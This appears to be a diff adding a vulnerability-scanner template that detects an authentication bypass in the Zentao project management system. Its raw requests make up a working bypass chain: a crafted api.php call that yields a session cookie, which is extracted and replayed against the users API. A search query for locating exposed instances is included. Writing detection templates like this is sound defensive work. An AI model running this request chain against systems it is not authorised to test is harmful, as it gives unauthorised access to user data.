@@ -1,0 +1,45 @@
+id: zentao-zentaosid-auth-bypass
+
+info:
+  name: Zentao Zentaosid - Auth Bypass
+  author: Co5mos
+  severity: high
+  description: Detects authentication bypass vulnerability in Zentao Zentaosid.
+  reference:
+    - https://mp.weixin.qq.com/s/hiGI_fQmXOHdkPqn6x00Jw
+  metadata:
+    fofa-query: title="用户登录- 禅道"
+  tags: zentao,auth-bypass
+
+http:
+  - raw:
+    - |
+      GET {{paths}}/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID={{randstr}}&branch={{randstr}} HTTP/1.1
+      Host: {{Hostname}}
+    
+    - |
+      GET {{paths}}/api.php/v1/users HTTP/1.1
+      Host: {{Hostname}}
+      Cookie: zentaosid={{zentaosid}}
+
+    payloads:
+      paths:
+        - ""
+        - "/zentao"
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200
+          - contains(body_2, "no company-browse priv")
+        condition: and
+    
+    extractors:
+      - type: regex
+        part: header
+        group: 1
+        name: zentaosid
+        internal: true
+        regex:
+          - 'Set-Cookie: zentaosid=(.*?);'
